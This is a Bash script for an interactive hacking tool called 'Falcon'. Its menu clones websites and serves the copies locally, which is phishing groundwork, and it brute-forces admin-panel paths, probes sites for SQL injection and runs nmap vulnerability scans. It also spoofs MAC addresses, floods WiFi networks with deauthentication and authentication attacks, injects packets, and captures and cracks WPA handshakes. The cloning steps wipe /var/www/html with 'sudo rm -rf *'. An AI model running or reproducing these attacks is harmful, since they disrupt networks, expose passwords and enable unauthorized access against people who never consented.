#!/bin/bash

# Author: Enríquez González https://github.com/AlvinPix
# instagram: @alvinpx_271
# facebook: @alvin.gonzalez.13139

# Working directory
directory=$(pwd)

# traps ctrl-x
trap ctrl_c INT

# Exit ctrl-c
function ctrl_c () {
exit 1
}

# Colors
Black='\033[1;30m'        # Black
Red='\033[1;31m'          # Red
Green='\033[1;32m'        # Green
Yellow='\033[1;33m'       # Yellow
Blue='\033[1;34m'         # Blue
Purple='\033[1;35m'       # Purple
Cyan='\033[1;36m'         # Cyan
White='\033[1;37m'        # White
NC='\033[0m'
blue='\033[0;34m'
white='\033[0;37m'
lred='\033[0;31m'

# Presentation of the script
banner () {
clear
echo ""
echo -e "${Cyan}  ███████╗ █████╗ ██╗      ██████╗ ██████╗ ███╗   ██╗		"
echo -e "${Cyan}  ██╔════╝██╔══██╗██║     ██╔════╝██╔═══██╗████╗  ██║		"
echo -e "${Cyan}  █████╗  ███████║██║     ██║     ██║   ██║██╔██╗ ██║		"
echo -e "${Cyan}  ██╔══╝  ██╔══██║██║     ██║     ██║   ██║██║╚██╗██║		"
echo -e "${Cyan}  ██║     ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║		"
echo -e "${Cyan}  ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝		"
echo -e "${White}	                    |					"
echo -e "${White}	____________    __ -+-  ____________			"
echo -e "${White}	\_____     /   /_ \ |   \     _____/			"
echo -e "${White}	 \_____    \____/  \____/    _____/			"
echo -e "${White}	  \_____                    _____/			"
echo -e "${White}	     \___________  ___________/				"
echo -e "${White}	               /____\					"
}

# The main menu
falcon () {
banner
echo ""
echo -e "${White} [${Cyan}1${White}] Exit the script		[${Cyan}4${White}] Auth attacks"
echo -e "${White} [${Cyan}2${White}] Websites attacks		[${Cyan}5${White}] Inject packets"
echo -e "${White} [${Cyan}3${White}] Deauth attacks		[${Cyan}6${White}] Capture handshake"
echo ""
echo -e "${White} [${Cyan}7${White}] Scan ip address"
echo -e "${White} [${Cyan}8${White}] Script credits"
echo ""
echo -ne "${White} [🦅] [${Cyan}Falcon${White}] -> ${Red}"
read fn

case $fn in

1)
echo ""
echo -e "${White} [🦅] [Stopping services by script]"
exit ;;

2)
webattacks ;;

3)
deuthattacks ;;

4)
authattacks ;;

5)
packetsinject ;;

6)
capturehanks ;;

7)
sncip ;;

8)
credits ;;

* )
echo ""
echo -e "${White} [🦅] [The option is not valid please choose a number]"
sleep 1
falcon ;;
esac
}

# Attacks websites falcon script
webattacks () {
echo ""
echo -e "${White} [${Cyan}1${White}] Clone website"
echo -e "${White} [${Cyan}2${White}] Clone index"
echo -e "${White} [${Cyan}3${White}] Search panel"
echo -e "${White} [${Cyan}4${White}] Search vuln"
echo ""
echo -e "${White} [${Cyan}r${White}] Return to main menu"
echo ""
echo -ne "${White} [🦅] [${Cyan}Falcon${White}] -> ${Red}"
read webtt

case $webtt in

1)
webclone ;;

2)
cloneindexweb ;;

3)
searhpanel ;;

4)
chkvuln ;;

r)
falcon ;;

* )
echo ""
echo -e "${White} [🦅] [The option is not valid please choose a number]"
sleep 1
falcon ;;
esac
}

webclone () {
echo ""
echo -ne "${White} [🦅] [Enter website without subdomains] -> ${Red}"
read web
echo ""
echo -ne "${White} [🦅] [Name of the folder where the website is stored] -> ${Red}"
read stored
echo ""
echo -e "${White} [🦅] [Cloned website ${Purple}${web}${White} please wait...]"
echo ""
mkdir -p $directory/Websites/$stored
cd $directory/Websites/$stored
httrack $web>/dev/null
echo -ne "${White} [🦅] [You want to run the cloned website] [Y/N] -> ${Red}"
read who
if [ $who = Y ]; then
        sleep 1
	cd /var/www/html
	sudo rm -rf *
        cd $directory/Websites/$stored
	sudo cp -r * /var/www/html
        sudo service apache2 start
	echo ""
	echo -e "${White} [🦅] [To view the website place in your browser ${Purple}http://localhost${White}]"
	echo ""
        echo -e "${White} [🦅] [Website cloned successfully press any key to continue]..."
        read
	sudo service apache2 stop
        falcon
else
        sleep 1
        echo ""
        echo -e "${White} [🦅] [Website cloned successfully press any key to continue]..."
        read
        falcon
fi
}

cloneindexweb () {
echo ""
echo -ne "${White} [🦅] [Enter website without subdomains] -> ${Red}"
read web
echo ""
echo -ne "${White} [🦅] [Name of the folder where the website is stored] -> ${Red}"
read stored
echo ""
echo -e "${White} [🦅] [Cloned website index ${Purple}${web}${White} please wait...]"
echo ""
mkdir -p $directory/Websites/$stored
cd $directory/Websites/$stored
curl --silent $web >> index.html
echo -ne "${White} [🦅] [You want to run the cloned website] [Y/N] -> ${Red}"
read who
if [ $who = Y ]; then
        sleep 1
        cd /var/www/html
        sudo rm -rf *
        cd $directory/Websites/$stored
	sudo cp index.html /var/www/html
        sudo service apache2 start
        echo ""
        echo -e "${White} [🦅] [To view the website place in your browser ${Purple}http://localhost${White}]"
        echo ""
        echo -e "${White} [🦅] [Website cloned successfully press any key to continue]..."
        read
        sudo service apache2 stop
        falcon
else
        sleep 1
        echo ""
        echo -e "${White} [🦅] [Website cloned successfully press any key to continue]..."
        read
        falcon
fi
}

searhpanel () {
echo ""
cd $directory/Wordlists
lsd -A -l
echo ""
echo -ne "${White} [🦅] [Enter the dictionary] -> ${Red}"
read keysworks
if [ -e $directory/Wordlists/$keysworks ]; then
	sleep 1
else
	sleep 1
fi
echo ""
echo -ne "${White} [🦅] [Enter website without subdomains, without subdirectories, without any forward slashes] -> ${Red}"
read webpanel
while read line
do
result=$(curl -s -I "$webpanel/$line" | head -n 1 | awk '{print $2}')
i=0
if [[ "$result" == "200" ]]; then
	i=$((i+1))
elif [[ "$result" == "302" ]]; then
	i=$((i+1))
fi

if [[ $i > 0 ]]; then
	cd $directory
	echo ""
	echo -e "${White} [🦅] [Web page ${Purple}$webpanel${Green}/$line${Cyan} found${White}]"
	sleep 2
	echo ""
	echo -e "${White} [🦅] [Possible page panel ${Purple}$webpanel/$line${White}]" >> "found.txt" 2>/dev/null
	echo -e "${White} [🦅] [Possible page panel ${Purple}$webpanel/$line${White}]"
	sleep 2
else
	echo ""
	echo -e "${White} [🦅] [Web page ${Purple}$webpanel${Green}/$line${Red} not found${White}]"
fi
done < $directory/Wordlists/$keysworks
echo ""
echo -e "${White} [🦅] [Press any key to continue]..."
read
falcon
}

chkvuln () {
echo ""
echo -ne "${White} [🦅] [Enter website without subdomains, without subdirectories, without any forward slashes] -> ${Red}"
read webpage
echo ""
echo -e "${White} [🦅] [Verifying ${Red}SQL ${White}vulnerability]"
echo ""
sleep 2
dork="'"
i2=0
sqli=$(curl -H "Accept: application/xml" -H "Content-Type: application/xml" --silent -X GET "$webpage$dork")

if echo "$sqli" | grep -q -i "Error SQL syntax"; then
	i2=$((i2+1))
fi

if echo "$sqli" | grep -q -i "mysql_fetch_array"; then
	i2=$((i2+1))
fi

if echo "$sqli" | grep -q -i "mysqli_fetch_array"; then
        i2=$((i2+1))
fi

if echo "$sqli" | grep -q -i "mysql_num_rows"; then
        i2=$((i2+1))
fi

if echo "$sqli" | grep -q -i "Warning: mysq"; then
        i2=$((i2+1))
fi

if [[ $i2 > 0 ]]; then
	echo -e "${White} [🦅] [Vulnerable website ${Purple}$webpage${Red} SQL ${White}injection]" >> "Vuln.txt" 2>/dev/null
	echo -e "${White} [🦅] [Vulnerable website ${Purple}$webpage${Red} SQL ${White}injection]"
else
	echo -e "${White} [🦅] [Website ${Purple}$webpage${White} not vulnerable to ${Red}SQL ${White}injection]" >> "Vuln.txt" 2>/dev/null
	echo -e "${White} [🦅] [Website ${Purple}$webpage${White} not vulnerable to ${Red}SQL ${White}injection]"
fi

echo ""
echo -e "${White} [🦅] [Checking ${Red}vulnerabilities${White} with ${Cyan}nmap${White}]"
sleep 2
echo ""
echo -ne "${White} [🦅] [Enter website port] -> ${Red}"
read webport
echo ""
echo "" >> "Vuln.txt"
sudo nmap --script http-enum -p$webport $webpage -vvv >> "Vuln.txt" 2>/dev/null
echo ""
echo "" >> "Vuln.txt"
sudo nmap --script vuln -p $webport $webpage >> "Vuln.txt" 2>/dev/null
echo ""
echo -e "${White} [🦅] [Press any key to continue]..."
read
falcon
}

# Deauth attacks falcon
deuthattacks () {
echo ""
echo -e "${White} [${Cyan}1${White}] All network using ${Red}mdk3"
echo -e "${White} [${Cyan}2${White}] All network using ${Cyan}mdk4"
echo -e "${White} [${Cyan}3${White}] Specific client using ${Yellow}aireplay-ng"
echo ""
echo -e "${White} [${Cyan}r${White}] Return to main menu"
echo ""
echo -ne "${White} [🦅] [${Cyan}Falcon${White}] -> ${Red}"
read deuth

case $deuth in

1)
mdk3attack ;;

2)
mdk4attack ;;

3)
aireplay-ngattack ;;

r)
falcon ;;

* )
echo ""
echo -e "${White} [🦅] [The option is not valid please choose a number]"
sleep 1
falcon ;;
esac
}

mdk3attack () {
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Setting new mac address ${Red}$wifi${White}]"
sleep 2
sudo ip link set $wifi down
sudo macchanger -r $wifi>/dev/null
sudo ip link set $wifi up
echo ""
echo -e "${White} [🦅] [New mac address set ${Cyan}$wifi${White}]"
sleep 2
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 30s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
echo ""
echo -ne "${White} [🦅] [Network channel] -> ${Red}"
read channel
echo ""
echo "$bssid" > "bssid.log"
sleep 1
echo -ne "${White} [🦅] [Attack duration] -> ${Red}"
read seconds
echo ""
sleep 1
echo -e "${White} [🦅] [Deauthentication attack ${Cyan}$bssid ${White}channel ${Purple}$channel${White} attack Duration ${Yellow}$seconds${White}]"
sleep 2
echo ""
sudo timeout --foreground $seconds$s mdk3 $wifi$mon d -b bssid.log -c $channel
echo ""
echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
sudo ifconfig $wifi down
sudo airmon-ng stop $wifi$mon>/dev/null
sudo service NetworkManager start
sudo ifconfig $wifi up
sudo rm -rf bssid.log
sleep 1
falcon
}

mdk4attack () {
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Setting new mac address ${Red}$wifi${White}]"
sleep 2
sudo ip link set $wifi down
sudo macchanger -r $wifi>/dev/null
sudo ip link set $wifi up
echo ""
echo -e "${White} [🦅] [New mac address set ${Cyan}$wifi${White}]"
sleep 2
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 30s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
echo ""
echo -ne "${White} [🦅] [Network channel] -> ${Red}"
read channel
echo ""
echo "$bssid" > "bssid.log"
sleep 1
echo -ne "${White} [🦅] [Attack duration] -> ${Red}"
read seconds
echo ""
sleep 1
echo -e "${White} [🦅] [Deauthentication attack ${Cyan}$bssid ${White}channel ${Purple}$channel${White} attack duration ${Yellow}$seconds${White}]"
sleep 2
echo ""
sudo timeout --foreground $seconds$s mdk4 $wifi$mon d -b bssid.log -c $channel
echo ""
echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
sudo ifconfig $wifi down
sudo airmon-ng stop $wifi$mon>/dev/null
sudo service NetworkManager start
sudo ifconfig $wifi up
sudo rm -rf bssid.log
sleep 1
falcon
}

aireplay-ngattack () {
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Setting new mac address ${Red}$wifi${White}]"
sleep 2
sudo ip link set $wifi down
sudo macchanger -r $wifi>/dev/null
sudo ip link set $wifi up
echo ""
echo -e "${White} [🦅] [New mac address set ${Cyan}$wifi${White}]"
sleep 2
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 30s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network channel] -> ${Red}"
read channel
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
sleep 1
echo ""
echo -ne "${White} [🦅] [Packets you want to transmit] -> ${Red}"
read packets
sleep 1
echo ""
echo -ne "${White} [🦅] [Destination client] -> ${Red}"
read client
sleep 1
echo ""
echo -e "${White} [🦅] [Deauthentication attack ${Cyan}$bssid${White} packets to transmit ${Purple}$packets${White} Destination client ${Yellow}$client${White} channel ${Green}$channel${White}]"
sleep 1
echo ""
sudo iwconfig $wifi$mon channel $channel
sudo aireplay-ng --deauth $packets -a $bssid -c $client $wifi$mon
echo ""
echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
sudo ifconfig $wifi down
sudo airmon-ng stop $wifi$mon>/dev/null
sudo service NetworkManager start
sudo ifconfig $wifi up
sleep 1
falcon
}

# Auth attacks falcon
authattacks () {
echo ""
echo -e "${White} [${Cyan}1${White}] All network using ${Red}mdk3"
echo -e "${White} [${Cyan}2${White}] All network using ${Cyan}mdk4"
echo ""
echo -e "${White} [${Cyan}r${White}] Return to main menu"
echo ""
echo -ne "${White} [🦅] [${Cyan}Falcon${White}] -> ${Red}"
read authattack

case $authattack in

1)
authmdk3 ;;

2)
authmdk4 ;;

r)
falcon ;;

* )
echo ""
echo -e "${White} [🦅] [The option is not valid please choose a number]"
sleep 1
falcon ;;
esac
}

authmdk3 () {
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Setting new mac address ${Red}$wifi${White}]"
sleep 2
sudo ip link set $wifi down
sudo macchanger -r $wifi>/dev/null
sudo ip link set $wifi up
echo ""
echo -e "${White} [🦅] [New mac address set ${Cyan}$wifi${White}]"
sleep 2
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 30s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
echo ""
echo "$bssid" > "bssid.log"
sleep 1
echo -ne "${White} [🦅] [Attack duration] -> ${Red}"
read seconds
echo ""
sleep 1
echo -e "${White} [🦅] [Authentication attack ${Cyan}$bssid${White} attack duration ${Yellow}$seconds${White}]"
sleep 1
echo ""
sudo timeout --foreground $seconds$s mdk3 $wifi$mon a -a bssid.log
echo ""
echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
sudo ifconfig $wifi down
sudo airmon-ng stop $wifi$mon>/dev/null
sudo service NetworkManager start
sudo ifconfig $wifi up
sudo rm -rf bssid.log
sleep 1
falcon
}

authmdk4 () {
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Setting new mac address ${Red}$wifi${White}]"
sleep 2
sudo ip link set $wifi down
sudo macchanger -r $wifi>/dev/null
sudo ip link set $wifi up
echo ""
echo -e "${White} [🦅] [New mac address set ${Cyan}$wifi${White}]"
sleep 2
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 30s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
echo ""
echo "$bssid" > "bssid.log"
sleep 1
echo -ne "${White} [🦅] [Attack duration] -> ${Red}"
read seconds
echo ""
sleep 1
echo -e "${White} [🦅] [Authentication attack ${Cyan}$bssid${White} attack duration ${Yellow}$seconds${White}]"
sleep 1
echo ""
sudo timeout --foreground $seconds$s mdk4 $wifi$mon a -a bssid.log
echo ""
echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
sudo ifconfig $wifi down
sudo airmon-ng stop $wifi$mon>/dev/null
sudo service NetworkManager start
sudo ifconfig $wifi up
sudo rm -rf bssid.log
sleep 1
falcon
}

# Inject packets falcon
packetsinject () {
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Setting new mac address ${Red}$wifi${White}]"
sleep 2
sudo ip link set $wifi down
sudo macchanger -r $wifi>/dev/null
val=$(ifconfig $wifi | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
sudo ip link set $wifi up
echo ""
echo -e "${White} [🦅] [New mac address set ${Cyan}$wifi${White}]"
sleep 2
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 30s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
echo ""
sleep 1
echo -ne "${White} [🦅] [Network channel] -> ${Red}"
read ch
echo ""
sleep 1
echo -ne "${White} [🦅] [Attack duration] -> ${Red}"
read seconds
echo ""
sleep 1
echo -e "${White} [🦅] [Injecting packets ${Cyan}$bssid${White} attack duration ${Yellow}$seconds${White} channel ${Green}$ch${White}]"
sleep 1
echo ""
sudo timeout --foreground $seconds$s xterm -hold -e "airodump-ng --bssid $bssid -c $ch  $wifi$mon" &
sleep 1
sudo timeout --foreground $seconds$s xterm -hold -e "aireplay-ng --fakeauth 2 -a $bssid -c $val $wifi$mon" &
sleep 1
sudo timeout --foreground $seconds$s xterm -hold -e "aireplay-ng --arpreplay -b $bssid -h $val $wifi$mon"
sleep 1
echo ""
echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
sudo ifconfig $wifi down
sudo airmon-ng stop $wifi$mon>/dev/null
sudo service NetworkManager start
sudo ifconfig $wifi up
sudo rm -rf replay_arp*
sleep 1
falcon
}

capturehanks () {
cd $directory/Catches
echo ""
echo -e "${White}"
iwconfig
echo ""
echo -ne "${White} [🦅] [Write your Interface] -> ${Red}"
read wifi
echo ""
echo -e "${White} [🦅] [Starting monitor mode ${Cyan}$wifi${White}]"
sleep 2
echo ""
sudo ifconfig $wifi down
sudo airmon-ng check kill
sudo airmon-ng start $wifi
sudo ifconfig $wifi up
sudo timeout --foreground 40s airodump-ng $wifi$mon
echo ""
echo -ne "${White} [🦅] [Network bssid] -> ${Red}"
read bssid
echo ""
sleep 1
echo -ne "${White} [🦅] [Network channel] -> ${Red}"
read ch
echo ""
sleep 1
echo -ne "${White} [🦅] [Enter handshake name] -> ${Red}"
read file
echo $bssid > $file
echo ""
sleep 1
echo -ne "${White} [🦅] [Attack duration ${Green}deauthentication${White}] -> ${Red}"
read seconds
echo ""
sleep 1
echo -e "${White} [🦅] [Handshake capture attack ${Cyan}$file${White} ${Green}$bssid${White} attack duration ${Yellow}$seconds${White} channel ${Red}$ch${White}]"
sleep 3
echo ""
sudo timeout --foreground 15s airodump-ng --bssid $bssid -c $ch $wifi$mon
sleep 1
sudo timeout --foreground $seconds$s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $wifi$mon" &
sleep 1
sudo timeout --foreground $seconds$s xterm -hold -e "airodump-ng -c $ch --bssid $bssid -w $file $wifi$mon"
echo ""
echo -e "${White} [🦅] [Handshake captured ${Cyan}$file.cap${White}]"
echo ""
echo -ne "${White} [🦅] [I want to decrypt the captured handshake] [Y/N] -> ${Red}"
read descrypt

if [ $descrypt = Y ]; then
	echo ""
	echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
        sudo ifconfig $wifi down
        sudo airmon-ng stop $wifi$mon>/dev/null
        sudo service NetworkManager start
        sudo ifconfig $wifi up
        sleep 1
	echo ""
	echo -e "${White} [🦅] [Decrypting handshake capture]"
	echo ""
	cd $directory/Wordlists
	lsd -A -l
	echo ""
	echo -ne "${White} [🦅] [Enter the dictionary] -> ${Red}"
	read keysworks
	echo ""
	cd $directory/Catches
	echo -e "${White}"
	sudo aircrack-ng $file-01.cap -w $directory/Wordlists/$keysworks
	echo ""
	echo -e "${White} [🦅] [press any key to continue]..."
        read
	sudo rm -rf $file $file-01.csv $file-01.kismet.csv $file-01.kismet.netxml $file-01.log.csv
	falcon
else
	echo ""
	echo -e "${White} [🦅] [Attack finished, stopping monitor mode, setting managed mode]"
        sudo ifconfig $wifi down
        sudo airmon-ng stop $wifi$mon>/dev/null
        sudo service NetworkManager start
        sudo ifconfig $wifi up
	sleep 1
	cd $directory/Catches
	sudo rm -rf $file $file-01.csv $file-01.kismet.csv $file-01.kismet.netxml $file-01.log.csv
	falcon
fi
}

sncip () {
echo ""
echo -ne "${White} [🦅] [IP adress] -> ${Red}"
read ip
echo ""
echo -e "${White} [🦅] [Scanning ${Yellow}$ip${White} with ${Cyan}nmap${White}]"
sleep 1
ping -c 1 ${ip} > ping.log
        for i in $(seq 60 70); do
                if test $(grep ttl=${i} ping.log -c) = 1; then
                        echo ""
                        echo -e "${White} [🦅] [${Yellow}Linux ${White}system detected ${Cyan}TTL=${i}${White} address ${Yellow}${ip}${White}]"
                        sleep 2
                        touch "report.txt"
                        echo "IP > ${ip}" >> "report.txt"
                        echo "Linux > TTL=${i}" >> "report.txt"
                        echo "" >> "report.txt"
fi
done

ping -c 1 ${ip} > ping.log
        for i in $(seq 100 200); do
                if test $(grep ttl=${i} ping.log -c) = 1; then
                        echo ""
                        echo -e "${White} [🦅] [${Blue}Windows ${White}system detected ${Cyan}TTL=${i}${White} address ${Yellow}${ip}${White}]"
                        sleep 2
                        touch "report.txt"
                        echo "IP > ${ip}" >> "report.txt"
                        echo "Windows > TTL=${i}" >> "report.txt"
                        echo "" >> "report.txt"
fi
done
cd $directory
rm -rf ping.log
sudo nmap -p- --open -sS -sCV --min-rate 5000 -vvv -n -Pn ${ip} >> "report.txt" 2>/dev/null
echo ""
sudo nmap -p- --open -sS -sCV --min-rate 5000 -vvv -n -Pn ${ip}
echo ""
echo -e "${White} [🦅] [press any key to continue]..."
read
falcon
}

credits () {
echo ""
echo -e "${White} [🦅] [${Cyan}Falcon${White} script author] --> ${Cyan}Enríquez González https://github.com/AlvinPix"
echo -e "${White} [🦅] [${Yellow}Instagram:${White} @alvinpx_271]"
echo -e "${White} [🦅] [${Yellow}Facebook:${White} @alvin.gonzalez.13139]"
echo ""
echo -e "${White} [🦅] [press any key to continue]..."
read
falcon
}

# Call menus the script
reset
falcon
